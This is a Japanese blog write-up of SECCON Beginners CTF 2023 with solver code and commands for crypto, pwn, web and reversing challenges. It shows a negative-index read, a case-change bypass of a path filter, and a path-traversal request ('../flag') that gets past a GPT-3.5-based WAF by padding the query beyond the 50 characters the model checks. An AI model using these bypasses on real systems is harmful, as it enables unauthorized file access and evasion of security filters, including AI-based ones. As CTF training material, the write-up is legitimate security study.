+++
title = "[writeup] SECCON Beginners CTF 2023"
date = 2023-06-04

[taxonomies]
tags = ["CTF", "writeup"]
+++


SECCON Beginners CTF 2023に参加しました。  
結果はWelcome以外で5問解き、778チーム中277位でした。

medium以上の問題はほぼ手がつけられないまま時間が来てしまいましたが楽しく参加させていただきました。  
運営の皆様ありがとうございました。


## crypto


### CoughingFox2

{{ image(src="https://fs.arch4e.com/blog/writeup_seccon_beginners_ctf_2023/CoughingFox2.png", alt="screenshot - probrem", position="center", style="width: 50vw") }}

まず、 `main.py` のアルゴリズムを確認する。

```python
cipher = []

for i in range(len(flag)-1):
    c = ((flag[i] + flag[i+1]) ** 2 + i)
    cipher.append(c)

random.shuffle(cipher)
```

復号するには、各文字に対してiを引いた後二乗根をとり前の文字を引く必要がある。  
しかし、暗号化の最後でshuffleをしているためiはわからない。

平文は、 `ctf4b{` の6文字が既知であるため、5文字分は対応する暗号が特定できる。  
6文字目以降は総当たりで復号処理を行い、 `string.printable` に含まれる文字になれば次の文字を解読する方法でsolverを書いた。

```python
# coding: utf-8
import math
import random
import string

# original
# cipher = [4396, 22819, 47998, 47995, 40007, 9235, 21625, 25006, 4397, 51534, 46680, 44129, 38055, 18513, 24368, 38451, 46240, 20758, 37257, 40830, 25293, 38845, 22503, 44535, 22210, 39632, 38046, 43687, 48413, 47525, 23718, 51567, 23115, 42461, 26272, 28933, 23726, 48845, 21924, 46225, 20488, 27579, 21636]

# flag = b"ctf4b{xxx___censored___xxx}" 
# cipher = [46225, 47525, 23718, 22503, 48845, 59054, 57606, 57607, 46233, 36109, 36110, 37647, 40012, 44534, 50639, 51091, 50641, 46242, 40419, 38044, 36120, 36121, 46247, 57623, 57624, 60050]

cipher = [4396, 22819, 47998, 47995, 40007, 9235, 21625, 25006, 4397, 51534, 46680, 44129, 38055, 18513, 24368, 38451, 46240, 20758, 37257, 40830, 25293, 38845, 44535, 22210, 39632, 38046, 43687, 48413, 51567, 23115, 42461, 26272, 28933, 23726, 21924, 20488, 27579, 21636]

def solve():
    m = b'ctf4b{'

    for i in range(len(m) - 1, len(cipher) + len(m) - 1):
        for c in cipher:
            tmp  = math.sqrt(c - i)
            code = tmp - m[i]
            if (code%1) == 0:
                char = chr(int(code))
                if char in string.printable:
                    cipher.remove(c)
                    m += bytes(char, 'utf-8')
                    break

    print(m)

if __name__ == '__main__':
    solve()
```

```
❯ python3 solve.py
b'ctf4b{hi_b3g1nner!g00d_1uck_4nd_h4ve_fun!!!}'
```


## pwnable


### poem

{{ image(src="https://fs.arch4e.com/blog/writeup_seccon_beginners_ctf_2023/poem.png", alt="screenshot - probrem", position="center", style="width: 50vw") }}

指定したインデックスに対応するポエムを出力するアプリケーションが渡されている。

```
❯ nc poem.beginners.seccon.games 9000
Number[0-4]: 0
In the depths of silence, the universe speaks.
```

コードを見ると負の入力値に対する防御がされていないため、 `-4` を入力してFLAGを参照できる。

```c
#include <stdio.h>
#include <unistd.h>

char *flag = "ctf4b{***CENSORED***}";
char *poem[] = {
    "In the depths of silence, the universe speaks.",
    "Raindrops dance on windows, nature's lullaby.",
    "Time weaves stories with the threads of existence.",
    "Hearts entwined, two souls become one symphony.",
    "A single candle's glow can conquer the darkest room.",
};

int main() {
  int n;
  printf("Number[0-4]: ");
  scanf("%d", &n);
  if (n < 5) {
    printf("%s\n", poem[n]);
  }
  return 0;
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}

```

```
❯ nc poem.beginners.seccon.games 9000
Number[0-4]: -4
ctf4b{y0u_sh0uld_v3rify_the_int3g3r_v4lu3}
```


## web


### Forbidden

{{ image(src="https://fs.arch4e.com/blog/writeup_seccon_beginners_ctf_2023/Forbidden.png", alt="screenshot - probrem", position="center", style="width: 50vw") }}

`/flag` にアクセスするとFLAGを入手できるが、URLに `/flag` が含まれていると弾かれる。  
`/FLAG` にアクセスすることでブロックを回避しアクセスを通すことができる。

```js
const block = (req, res, next) => {
    if (req.path.includes('/flag')) {
        return res.send(403, 'Forbidden :(');
    }

    next();
}

app.get("/flag", block, (req, res, next) => {
    return res.send(FLAG);
})

var server = app.listen(PORT, HOST, () => {
    console.log("Listening:" + server.address().port);
});
```

```
❯ curl https://forbidden.beginners.seccon.games/flag
Forbidden :(

❯ curl https://forbidden.beginners.seccon.games/FLAG
ctf4b{403_forbidden_403_forbidden_403}
```


### aiwaf

{{ image(src="https://fs.arch4e.com/blog/writeup_seccon_beginners_ctf_2023/aiwaf.png", alt="screenshot - probrem", position="center", style="width: 50vw") }}

flagはWeb Appのコンテンツがあるディレクトリよりひとつ上の階層に保存されている。  
パストラバーサルの可能性があるクエリや `flag` の文字列があるとAIによってブロックされる。

AIに送信するプロンプトはクエリ文字の先頭50文字のため、paddingを挿入して `../flag` を送信対象から外した。  

```python
import uuid
import openai
import urllib.parse
from flask import Flask, request, abort

# from flask_limiter import Limiter
# from flask_limiter.util import get_remote_address

##################################################
# OpenAI API key
KEY = "****REDACTED****"
##################################################

app = Flask(__name__)
app.config["RATELIMIT_HEADERS_ENABLED"] = True

# limiter = Limiter(get_remote_address, app=app, default_limits=["3 per minute"])

openai.api_key = KEY

top_page = """
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8" />
    <title>亞空文庫</title>
</head>

<body>
    <h1>亞空文庫</h1>
    AIにセキュリティの物語を書いてもらいました。<br>
    内容は正しいかどうかわかりません。<br>
<ul>
    <li><a href="/?file=book0.txt">あ書</a></li>
    <li><a href="/?file=book1.txt">い書</a></li>
    <li><a href="/?file=book2.txt">う書</a></li>
    <!-- <li><a href="/?file=book3.txt">え書</a></li> -->
</ul>

※セキュリティのためAI-WAFを導入しています。<br>
© 2023 ももんがの書房
</body>

</html>
"""


@app.route("/")
def top():
    file = request.args.get("file")
    if not file:
        return top_page
    if file in ["book0.txt", "book1.txt", "book2.txt"]:
        with open(f"./books/{file}", encoding="utf-8") as f:
            return f.read()
    # AI-WAF
    puuid = uuid.uuid4()
    prompt = f"""\
以下の{puuid}に囲まれた部分のURLクエリはパストラバーサル攻撃でしょうか？
そうである場合Yesを、違う場合Noを返してください。
../やflagという文字列が含まれていた場合もYesを返してください。

{puuid}
{urllib.parse.unquote(request.query_string)[:50]}
{puuid}
"""
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {
                    "role": "user",
                    "content": prompt,
                },
            ],
        )
        result = response.choices[0]["message"]["content"].strip()
    except:
        return abort(500, "OpenAI APIのエラーです。\n少し時間をおいてアクセスしてください。")
    if "No" in result:
        with open(f"./books/{file}", encoding="utf-8") as f:
            return f.read().replace(KEY, "")
    return abort(403, "AI-WAFに検知されました👻")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=31415)

```

```
❯ curl 'https://aiwaf.beginners.seccon.games/?file=../flag'
<!doctype html>
<html lang=en>
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>AI-WAFに検知されました👻</p>

❯ curl 'https://aiwaf.beginners.seccon.games/?padding=PADDINGPADDINGPADDINGPADDINGPADDINGPADDINGPADDING&file=../flag'
ctf4b{pr0mp7_1nj3c710n_c4n_br34k_41_w4f}
```


## reversing


### Half

{{ image(src="https://fs.arch4e.com/blog/writeup_seccon_beginners_ctf_2023/Half.png", alt="screenshot - probrem", position="center", style="width: 50vw") }}

いつもの

```
$ strings half | grep ctf
ctf4b{ge4_t0_kn0w_the

$ strings half | grep }
_bin4ry_fi1e_with_s4ring3}
```

